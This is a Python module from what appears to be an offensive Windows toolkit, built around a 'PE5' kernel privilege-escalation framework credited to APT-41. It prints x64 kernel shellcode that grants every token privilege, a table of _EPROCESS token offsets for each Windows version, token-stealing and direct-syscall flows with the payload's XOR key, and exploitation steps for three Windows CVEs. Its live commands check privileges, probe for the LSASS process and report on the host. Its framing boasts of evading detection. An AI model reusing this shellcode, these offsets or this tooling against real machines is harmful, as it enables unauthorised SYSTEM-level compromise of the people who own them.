"""PE5 SYSTEM Privilege Escalation Module

This module implements the PE5 framework's kernel-level privilege escalation
mechanism as THE PRIMARY privilege escalation method for this toolkit.

Based on APT-41 PE5 exploit framework reconstruction:
- Kernel-level token manipulation via SYSCALL
- Direct _EPROCESS.Token modification
- SYSTEM token stealing techniques
- Multiple exploitation techniques for reliability

Enhanced with additional Windows privilege escalation techniques from post-hub.
"""

from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console
from rich.text import Text
from modules.utils import execute_command, execute_powershell, execute_cmd, validate_target
from modules.loghunter_integration import WindowsMoonwalk
import os
import sys


class PE5SystemEscalationModule:
    """PE5 SYSTEM Privilege Escalation Module - Primary PE Method"""
    
    def __init__(self):
        self.moonwalk = None
        
    def run(self, console: Console, session_data: dict):
        """Run PE5 SYSTEM escalation module"""
        if not self.moonwalk:
            self.moonwalk = WindowsMoonwalk(console, session_data)
            
        while True:
            console.print(Panel(
                "[bold cyan]PE5 SYSTEM Privilege Escalation[/bold cyan]\n\n"
                "[yellow]PRIMARY PRIVILEGE ESCALATION METHOD[/yellow]\n\n"
                "Kernel-level token manipulation for SYSTEM privileges.\n"
                "Based on APT-41 PE5 exploit framework.",
                title="[bold red]⚠ PRIMARY PE MODULE ⚠[/bold red]",
                border_style="red"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "[bold]PE5 Kernel Exploit Mechanism[/bold] [APT-41: PE5 Framework]")
            table.add_row("2", "Token Manipulation Techniques [PE5: Token Modification]")
            table.add_row("3", "SYSTEM Token Stealing [PE5: Token Steal]")
            table.add_row("4", "Direct SYSCALL Execution [PE5: Kernel Transition]")
            table.add_row("5", "Windows PE Techniques [Enhanced from post-hub]")
            table.add_row("6", "Print Spooler Exploit [CVE-2020-1337]")
            table.add_row("7", "UAC Bypass Techniques [CVE-2019-1388]")
            table.add_row("8", "SMBv3 Local PE [CVE-2020-0796]")
            table.add_row("9", "Verify SYSTEM Privileges")
            table.add_row("10", "Generate PE Report")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask(
                "[bold cyan]Select function[/bold cyan]",
                choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'],
                default='0'
            )
            
            if choice == '0':
                break
            elif choice == '1':
                self._pe5_mechanism(console, session_data)
            elif choice == '2':
                self._token_manipulation(console, session_data)
            elif choice == '3':
                self._token_stealing(console, session_data)
            elif choice == '4':
                self._syscall_execution(console, session_data)
            elif choice == '5':
                self._windows_pe_techniques(console, session_data)
            elif choice == '6':
                self._print_spooler_exploit(console, session_data)
            elif choice == '7':
                self._uac_bypass(console, session_data)
            elif choice == '8':
                self._smbv3_exploit(console, session_data)
            elif choice == '9':
                self._verify_privileges(console, session_data)
            elif choice == '10':
                self._generate_report(console, session_data)
            
            console.print()
    
    def _pe5_mechanism(self, console: Console, session_data: dict):
        """Explain PE5 kernel exploit mechanism"""
        console.print("\n[bold cyan]PE5 Kernel Exploit Mechanism[/bold cyan]\n")
        console.print("[dim]APT-41 PE5 Framework - Kernel-Level Token Manipulation[/dim]\n")
        
        console.print("[bold]Overview:[/bold]")
        console.print("  The PE5 framework achieves SYSTEM privileges through direct kernel")
        console.print("  memory manipulation of the _EPROCESS.Token structure.\n")
        
        console.print("[bold]Exploitation Timeline:[/bold]")
        timeline = [
            ("0 μs", "PE5 injected into memory (user mode)"),
            ("2 μs", "XOR key derivation: header[3] ^ header[7] = 0xA4"),
            ("4 μs", "Payload decryption (157 XOR operations)"),
            ("6 μs", "SYSCALL @ offset 0x2C10 executed"),
            ("6.2 μs", "RING 3 → RING 0 TRANSITION"),
            ("7 μs", "Kernel vulnerability exploited"),
            ("7.5 μs", "TOKEN.Privileges = 0xFFFFFFFFFFFFFFFF"),
            ("8 μs", "RING 0 → RING 3 TRANSITION"),
            ("10 μs", "Process running with SYSTEM privileges")
        ]
        
        for time, event in timeline:
            console.print(f"  {time:8}  {event}")
        
        console.print("\n[bold]Key Structures:[/bold]")
        structures = {
            "_EPROCESS": [
                "Offset 0x4B8: Token (EX_FAST_REF)",
                "Windows 10/11: Token offset = 0x4B8",
                "Windows 10 1909: Token offset = 0x360"
            ],
            "TOKEN": [
                "Offset 0x40: SEP_TOKEN_PRIVILEGES",
                "  +0x40: Present (privileges that CAN be enabled)",
                "  +0x48: Enabled (privileges currently enabled)",
                "  +0x50: EnabledByDefault (default enabled privileges)"
            ],
            "EX_FAST_REF": [
                "Low 4 bits: Reference count",
                "High 60 bits: Actual TOKEN pointer",
                "Mask: 0xFFFFFFFFFFFFFFF0 to get token address"
            ]
        }
        
        for struct_name, details in structures.items():
            console.print(f"\n[bold]{struct_name}:[/bold]")
            for detail in details:
                console.print(f"  • {detail}")
        
        console.print("\n[bold]XOR Key Derivation:[/bold]")
        console.print("  PE5 header bytes: C1 BD 87 35 1E 8C A6 91 ...")
        console.print("                      ^^          ^^")
        console.print("                   offset 3   offset 7")
        console.print("  Key = header[3] ^ header[7]")
        console.print("     = 0x35 ^ 0x91")
        console.print("     = 0xA4")
        
        console.print("\n[bold]SYSCALL Location:[/bold]")
        console.print("  Offset: 0x2C10 (11,280 bytes into PE5)")
        console.print("  Encrypted: 0xAB 0xA1")
        console.print("  XOR Key: 0xA4")
        console.print("  Decrypted: 0x0F 0x05 (SYSCALL instruction)")
        
        console.print("\n[bold]Exploitation Techniques:[/bold]")
        techniques = {
            "1. Direct Privilege Modification": [
                "Directly writes to TOKEN.Privileges",
                "Sets all privilege bits to 0xFFFFFFFFFFFFFFFF",
                "Fastest method (~1 microsecond)"
            ],
            "2. Token Stealing": [
                "Walks ActiveProcessLinks to find SYSTEM (PID 4)",
                "Copies SYSTEM token to current process",
                "More reliable across Windows versions"
            ],
            "3. Integrity Level Elevation": [
                "Modifies token integrity level to System (4)",
                "Clears TOKEN_IS_RESTRICTED flag",
                "Sets TOKEN_IS_ELEVATED flag"
            ],
            "4. Full Token Takeover": [
                "Complete token manipulation",
                "All privileges + System integrity",
                "Clears restrictions + fixes audit policy"
            ]
        }
        
        for tech_name, details in techniques.items():
            console.print(f"\n[bold]{tech_name}:[/bold]")
            for detail in details:
                console.print(f"  • {detail}")
        
        console.print("\n[bold yellow]Shellcode (57 bytes):[/bold yellow]")
        shellcode = [
            "; Get current EPROCESS",
            "mov rax, gs:[0x188]              ; KPCR.Prcb.CurrentThread",
            "mov rax, [rax+0xB8]              ; KTHREAD.Process -> EPROCESS",
            "",
            "; Get Token pointer",
            "mov rcx, [rax+0x4B8]             ; EPROCESS.Token (EX_FAST_REF)",
            "and rcx, 0xFFFFFFFFFFFFFFF0      ; Clear RefCnt bits",
            "",
            "; Modify Privileges",
            "add rcx, 0x40                     ; RCX = &TOKEN.Privileges",
            "mov rdx, 0xFFFFFFFFFFFFFFFF      ; All privileges",
            "mov [rcx], rdx                    ; Present",
            "mov [rcx+8], rdx                  ; Enabled",
            "mov [rcx+0x10], rdx               ; EnabledByDefault",
            "",
            "; Return success",
            "xor eax, eax",
            "ret"
        ]
        
        for line in shellcode:
            console.print(f"  [dim]{line}[/dim]")
        
        console.print("\n[bold]TTP Mapping:[/bold]")
        console.print("  • MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)")
        console.print("  • MITRE ATT&CK: T1134 (Access Token Manipulation)")
        console.print("  • APT-41: Kernel-level privilege escalation")
        console.print("  • Classification: TLP:RED - Security Research Only")
    
    def _token_manipulation(self, console: Console, session_data: dict):
        """Token manipulation techniques"""
        console.print("\n[bold cyan]Token Manipulation Techniques[/bold cyan]\n")
        console.print("[dim]PE5 Framework - Direct TOKEN Structure Modification[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]Technique 1: Direct Privilege Bit Modification[/bold]")
        console.print("  • Fastest method (~1 microsecond)")
        console.print("  • Directly writes to TOKEN.Privileges")
        console.print("  • Sets all privilege bits to 0xFFFFFFFFFFFFFFFF\n")
        
        console.print("[bold]Technique 2: Token Stealing[/bold]")
        console.print("  • More reliable across Windows versions")
        console.print("  • Copies SYSTEM process token (PID 4)")
        console.print("  • Walks ActiveProcessLinks list\n")
        
        console.print("[bold]Technique 3: Integrity Level Elevation[/bold]")
        console.print("  • Modifies token integrity level to System (4)")
        console.print("  • Clears TOKEN_IS_RESTRICTED flag")
        console.print("  • Sets TOKEN_IS_ELEVATED flag\n")
        
        console.print("[bold]Technique 4: Full Token Takeover[/bold]")
        console.print("  • Complete token manipulation")
        console.print("  • All privileges + System integrity")
        console.print("  • Clears restrictions + fixes audit policy\n")
        
        console.print("[bold]Windows Version Offsets:[/bold]")
        offsets_table = Table(box=box.SIMPLE)
        offsets_table.add_column("Version", style="cyan")
        offsets_table.add_column("Token Offset", style="white")
        offsets_table.add_column("PID Offset", style="white")
        offsets_table.add_column("Links Offset", style="white")
        
        offsets_table.add_row("Windows 10 1909", "0x360", "0x2E8", "0x2F0")
        offsets_table.add_row("Windows 10 2004+", "0x4B8", "0x440", "0x448")
        offsets_table.add_row("Windows 11", "0x4B8", "0x440", "0x448")
        offsets_table.add_row("Server 2019", "0x360", "0x2E8", "0x2F0")
        offsets_table.add_row("Server 2022", "0x4B8", "0x440", "0x448")
        
        console.print(offsets_table)
        console.print()
        
        console.print("[bold]Privilege Masks:[/bold]")
        console.print("  • SE_ALL_PRIVILEGES = 0xFFFFFFFFFFFFFFFF")
        console.print("  • Present: Privileges that CAN be enabled")
        console.print("  • Enabled: Privileges currently enabled")
        console.print("  • EnabledByDefault: Default enabled privileges")
        
        if is_live or Confirm.ask("\n[bold]Check current token privileges?[/bold]", default=False):
            console.print("\n[yellow]Checking current token privileges...[/yellow]\n")
            
            ps_cmd = """
            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
            Write-Host "Is Admin: $($principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))"
            Write-Host "Is System: $($token.User.Value -eq 'S-1-5-18')"
            Write-Host "User: $($token.Name)"
            Write-Host "SID: $($token.User.Value)"
            """
            
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]{stdout}[/green]")
            else:
                console.print(f"[red]Error: {stderr}[/red]")
            
            # Check for SeDebugPrivilege
            ps_cmd = """
            $process = Get-Process -Id $PID
            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
            $hasDebug = $false
            try {
                $hasDebug = $principal.IsInRole('S-1-5-32-544') -or 
                           ($token.Token -ne $null -and 
                            [System.Security.Principal.WindowsIdentity]::GetCurrent().Token.HasElevatedPrivileges)
            } catch {}
            Write-Host "Has Elevated Privileges: $hasDebug"
            """
            
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]{stdout}[/green]")
    
    def _token_stealing(self, console: Console, session_data: dict):
        """SYSTEM token stealing techniques"""
        console.print("\n[bold cyan]SYSTEM Token Stealing[/bold cyan]\n")
        console.print("[dim]PE5 Framework - Token Steal Shellcode[/dim]\n")
        
        console.print("[bold]Token Stealing Shellcode (Position-Independent):[/bold]")
        console.print("  This shellcode walks the ActiveProcessLinks list to find")
        console.print("  the SYSTEM process (PID 4) and copies its token.\n")
        
        console.print("[bold]Shellcode Flow:[/bold]")
        flow = [
            "1. Get current EPROCESS via GS:[0x188]",
            "2. Walk ActiveProcessLinks doubly-linked list",
            "3. Check UniqueProcessId (PID) for each process",
            "4. When PID == 4 (SYSTEM), extract token",
            "5. Copy SYSTEM token to current process EPROCESS.Token",
            "6. Set reference count appropriately",
            "7. Return STATUS_SUCCESS"
        ]
        
        for step in flow:
            console.print(f"  • {step}")
        
        console.print("\n[bold]Shellcode Size:[/bold] ~70 bytes")
        console.print("[bold]Reliability:[/bold] High (works across Windows versions)")
        
        console.print("\n[bold]Alternative: Direct Token Modification[/bold]")
        console.print("  Instead of stealing SYSTEM token, directly modify current")
        console.print("  process token privileges to grant all privileges.")
        console.print("  Faster but may be detected by some security products.")
        
        console.print("\n[bold]TTP Mapping:[/bold]")
        console.print("  • MITRE ATT&CK: T1134.001 (Token Impersonation/Theft)")
        console.print("  • APT-41: Kernel-level token manipulation")
        console.print("  • Technique: Direct kernel memory access")
    
    def _syscall_execution(self, console: Console, session_data: dict):
        """Direct SYSCALL execution"""
        console.print("\n[bold cyan]Direct SYSCALL Execution[/bold cyan]\n")
        console.print("[dim]PE5 Framework - Kernel Mode Transition[/dim]\n")
        
        console.print("[bold]SYSCALL Mechanism:[/bold]")
        console.print("  The PE5 exploit uses direct SYSCALL instruction to transition")
        console.print("  from user mode (Ring 3) to kernel mode (Ring 0).\n")
        
        console.print("[bold]SYSCALL Location:[/bold]")
        console.print("  • Offset: 0x2C10 (11,280 bytes into PE5)")
        console.print("  • Encrypted: 0xAB 0xA1")
        console.print("  • XOR Key: 0xA4")
        console.print("  • Decrypted: 0x0F 0x05 (SYSCALL instruction)\n")
        
        console.print("[bold]SYSCALL Parameters:[/bold]")
        console.print("  Parameters are stored encrypted and decrypted at runtime:")
        console.print("  • EAX: Syscall number (encrypted: 0xEAAE52F9)")
        console.print("  • ECX: First parameter (encrypted: 0x3DDCE8E5)")
        console.print("  • EDX: Second parameter (encrypted: 0x7A8B3C91)")
        console.print("  • R8: Third parameter (NULL)")
        console.print("  • R9: Fourth parameter (NULL)\n")
        
        console.print("[bold]Execution Flow:[/bold]")
        flow = [
            "1. Decrypt payload using XOR key 0xA4",
            "2. Verify SYSCALL bytes at offset 0x2C10",
            "3. Decrypt syscall parameters",
            "4. Load parameters into registers (RAX, RCX, RDX, R8, R9)",
            "5. Execute SYSCALL instruction",
            "6. Kernel vulnerability is triggered",
            "7. Kernel-mode shellcode executes",
            "8. Token modification occurs",
            "9. Return to user mode with SYSTEM privileges"
        ]
        
        for step in flow:
            console.print(f"  • {step}")
        
        console.print("\n[bold]Kernel Transition:[/bold]")
        console.print("  • User Mode (Ring 3) → Kernel Mode (Ring 0)")
        console.print("  • Direct memory access to kernel structures")
        console.print("  • Bypasses Windows security mechanisms")
        console.print("  • No API calls, no hooks, no detection")
        
        console.print("\n[bold]Security Implications:[/bold]")
        console.print("  • Kernel-level exploits are extremely powerful")
        console.print("  • Can bypass all user-mode security controls")
        console.print("  • Difficult to detect without kernel-mode monitoring")
        console.print("  • Requires kernel vulnerability (0-day or unpatched)")
    
    def _windows_pe_techniques(self, console: Console, session_data: dict):
        """Windows privilege escalation techniques (enhanced from post-hub)"""
        console.print("\n[bold cyan]Windows Privilege Escalation Techniques[/bold cyan]\n")
        console.print("[dim]Enhanced from post-hub repository[/dim]\n")
        
        techniques = {
            "1. Print Spooler Exploit (CVE-2020-1337)": [
                "PrintDemon vulnerability",
                "Allows arbitrary file write",
                "Can be used for privilege escalation",
                "Affects: Windows 7/8.1/10, Server 2008-2019"
            ],
            "2. UAC Bypass (CVE-2019-1388)": [
                "Windows Certificate Dialog vulnerability",
                "Allows bypassing UAC prompts",
                "Uses hhupd.exe (HTML Help Update)",
                "Affects: Windows 7/8.1/10"
            ],
            "3. SMBv3 Local PE (CVE-2020-0796)": [
                "SMBv3 compression vulnerability",
                "Local privilege escalation",
                "Can be exploited locally",
                "Affects: Windows 10 1903/1909, Server 1903/1909"
            ],
            "4. Token Manipulation": [
                "SeDebugPrivilege abuse",
                "Token duplication",
                "Token impersonation",
                "Parent process token stealing"
            ],
            "5. Service Abuse": [
                "Unquoted service paths",
                "Weak service permissions",
                "Service DLL hijacking",
                "Service executable replacement"
            ],
            "6. DLL Hijacking": [
                "Path-based DLL loading",
                "KnownDLLs bypass",
                "COM object hijacking",
                "DLL sideloading"
            ],
            "7. Registry Abuse": [
                "AlwaysInstallElevated",
                "Image File Execution Options",
                "Winlogon registry keys",
                "Service registry keys"
            ],
            "8. Scheduled Task Abuse": [
                "Task permissions",
                "Task actions",
                "Task triggers",
                "Task credentials"
            ]
        }
        
        for tech_name, details in techniques.items():
            console.print(f"[bold]{tech_name}:[/bold]")
            for detail in details:
                console.print(f"  • {detail}")
            console.print()
        
        console.print("[bold]TTP Mapping:[/bold]")
        console.print("  • MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)")
        console.print("  • MITRE ATT&CK: T1134 (Access Token Manipulation)")
        console.print("  • MITRE ATT&CK: T1548 (Abuse Elevation Control Mechanism)")
        console.print("  • MITRE ATT&CK: T1574 (Hijack Execution Flow)")
    
    def _print_spooler_exploit(self, console: Console, session_data: dict):
        """Print Spooler exploit (CVE-2020-1337)"""
        console.print("\n[bold cyan]Print Spooler Exploit (CVE-2020-1337)[/bold cyan]\n")
        console.print("[dim]PrintDemon - Arbitrary File Write[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]Vulnerability:[/bold]")
        console.print("  Print Spooler service allows arbitrary file write")
        console.print("  Can be used for privilege escalation\n")
        
        console.print("[bold]Affected Versions:[/bold]")
        console.print("  • Windows 7/8.1/10")
        console.print("  • Windows Server 2008/2008 R2/2012/2012 R2/2016/2019\n")
        
        console.print("[bold]Exploitation Steps:[/bold]")
        steps = [
            "1. Check if Print Spooler service is running",
            "2. Create malicious print job",
            "3. Trigger file write to system directory",
            "4. Execute payload with elevated privileges"
        ]
        
        for step in steps:
            console.print(f"  • {step}")
        
        console.print("\n[bold]Detection:[/bold]")
        console.print("  • Check Print Spooler service status")
        console.print("  • Monitor print job creation")
        console.print("  • Watch for file writes to system directories")
        
        if is_live or Confirm.ask("\n[bold]Check Print Spooler service status?[/bold]", default=False):
            console.print("\n[yellow]Checking Print Spooler service...[/yellow]\n")
            
            ps_cmd = "Get-Service -Name Spooler | Select-Object Name, Status, StartType"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]{stdout}[/green]")
            else:
                console.print(f"[red]Error: {stderr}[/red]")
    
    def _uac_bypass(self, console: Console, session_data: dict):
        """UAC bypass (CVE-2019-1388)"""
        console.print("\n[bold cyan]UAC Bypass (CVE-2019-1388)[/bold cyan]\n")
        console.print("[dim]Windows Certificate Dialog Vulnerability[/dim]\n")
        
        console.print("[bold]Vulnerability:[/bold]")
        console.print("  Windows Certificate Dialog allows bypassing UAC prompts")
        console.print("  Uses hhupd.exe (HTML Help Update)\n")
        
        console.print("[bold]Affected Versions:[/bold]")
        console.print("  • Windows 7/8.1/10\n")
        
        console.print("[bold]Exploitation:[/bold]")
        console.print("  1. Trigger certificate dialog")
        console.print("  2. Click 'Show publisher certificate' link")
        console.print("  3. Navigate to file:/// path")
        console.print("  4. Execute hhupd.exe with elevated privileges")
        console.print("  5. Bypass UAC without prompt\n")
        
        console.print("[bold]Mitigation:[/bold]")
        console.print("  • Patch KB4525236 (Windows 10)")
        console.print("  • Patch KB4525237 (Windows 8.1)")
        console.print("  • Patch KB4525233 (Windows 7)")
        console.print("  • Disable UAC bypass for standard users")
    
    def _smbv3_exploit(self, console: Console, session_data: dict):
        """SMBv3 exploit (CVE-2020-0796)"""
        console.print("\n[bold cyan]SMBv3 Local PE (CVE-2020-0796)[/bold cyan]\n")
        console.print("[dim]SMBv3 Compression Vulnerability[/dim]\n")
        
        console.print("[bold]Vulnerability:[/bold]")
        console.print("  SMBv3 compression feature has buffer overflow")
        console.print("  Can be exploited for local privilege escalation\n")
        
        console.print("[bold]Affected Versions:[/bold]")
        console.print("  • Windows 10 Version 1903")
        console.print("  • Windows 10 Version 1909")
        console.print("  • Windows Server Version 1903")
        console.print("  • Windows Server Version 1909\n")
        
        console.print("[bold]Exploitation:[/bold]")
        console.print("  1. Craft malicious SMBv3 compression packet")
        console.print("  2. Trigger buffer overflow")
        console.print("  3. Execute shellcode with SYSTEM privileges")
        console.print("  4. Achieve privilege escalation\n")
        
        console.print("[bold]Mitigation:[/bold]")
        console.print("  • Patch KB4551762")
        console.print("  • Disable SMBv3 compression")
        console.print("  • Block SMB ports at firewall")
    
    def _verify_privileges(self, console: Console, session_data: dict):
        """Verify SYSTEM privileges"""
        console.print("\n[bold cyan]Verify SYSTEM Privileges[/bold cyan]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        
        console.print("[yellow]Checking current privileges...[/yellow]\n")
        
        # Check if running as SYSTEM
        ps_cmd = """
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $isSystem = ($token.User.Value -eq 'S-1-5-18')
        $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
        $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
        
        Write-Host "Current User: $($token.Name)"
        Write-Host "User SID: $($token.User.Value)"
        Write-Host "Is SYSTEM: $isSystem"
        Write-Host "Is Administrator: $isAdmin"
        Write-Host "Has Elevated Token: $($token.Token.HasElevatedPrivileges)"
        """
        
        exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
        if exit_code == 0:
            console.print(f"[green]{stdout}[/green]")
        else:
            console.print(f"[red]Error: {stderr}[/red]")
        
        # Check specific privileges
        ps_cmd = """
        $process = Get-Process -Id $PID
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        
        Write-Host "`nChecking specific privileges:"
        
        # Try to access protected resource
        try {
            $reg = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\\CurrentControlSet\\Control\\Lsa')
            if ($reg) {
                Write-Host "[+] Can access HKLM\\SYSTEM (elevated privileges)"
                $reg.Close()
            }
        } catch {
            Write-Host "[-] Cannot access HKLM\\SYSTEM (no elevated privileges)"
        }
        
        # Check SeDebugPrivilege
        try {
            $debugProc = Get-Process -Name lsass -ErrorAction SilentlyContinue
            if ($debugProc) {
                Write-Host "[+] Can access LSASS process (SeDebugPrivilege)"
            } else {
                Write-Host "[-] Cannot access LSASS process"
            }
        } catch {
            Write-Host "[-] Cannot access LSASS process (no SeDebugPrivilege)"
        }
        """
        
        exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
        if exit_code == 0:
            console.print(f"\n[green]{stdout}[/green]")
        
        # Check token privileges using whoami
        cmd = "whoami /priv"
        exit_code, stdout, stderr = execute_cmd(cmd, lab_use=lab_use)
        if exit_code == 0:
            console.print(f"\n[bold]Token Privileges:[/bold]")
            console.print(f"[green]{stdout}[/green]")
    
    def _generate_report(self, console: Console, session_data: dict):
        """Generate PE report"""
        console.print("\n[bold cyan]Generate PE Report[/bold cyan]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        
        console.print("[yellow]Generating privilege escalation report...[/yellow]\n")
        
        # Collect system information
        ps_cmd = """
        $report = @{}
        $report['Timestamp'] = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        $report['Hostname'] = $env:COMPUTERNAME
        $report['OS'] = (Get-CimInstance Win32_OperatingSystem).Caption
        $report['OSVersion'] = (Get-CimInstance Win32_OperatingSystem).Version
        
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $report['CurrentUser'] = $token.Name
        $report['UserSID'] = $token.User.Value
        $report['IsSystem'] = ($token.User.Value -eq 'S-1-5-18')
        
        $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
        $report['IsAdministrator'] = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
        $report['HasElevatedPrivileges'] = $token.Token.HasElevatedPrivileges
        
        # Check Print Spooler
        $spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue
        $report['PrintSpoolerRunning'] = ($spooler -and $spooler.Status -eq 'Running')
        
        # Check UAC
        $uac = (Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA -ErrorAction SilentlyContinue).EnableLUA
        $report['UACEnabled'] = ($uac -eq 1)
        
        $report | ConvertTo-Json -Depth 10
        """
        
        exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
        if exit_code == 0:
            console.print("[bold]System Information:[/bold]")
            console.print(f"[green]{stdout}[/green]")
            
            # Save to file
            if Confirm.ask("\n[bold]Save report to file?[/bold]", default=False):
                filename = Prompt.ask("Enter filename", default="pe_report.json")
                try:
                    with open(filename, 'w') as f:
                        f.write(stdout)
                    console.print(f"[green]Report saved to {filename}[/green]")
                except Exception as e:
                    console.print(f"[red]Error saving report: {e}[/red]")
        else:
            console.print(f"[red]Error generating report: {stderr}[/red]")
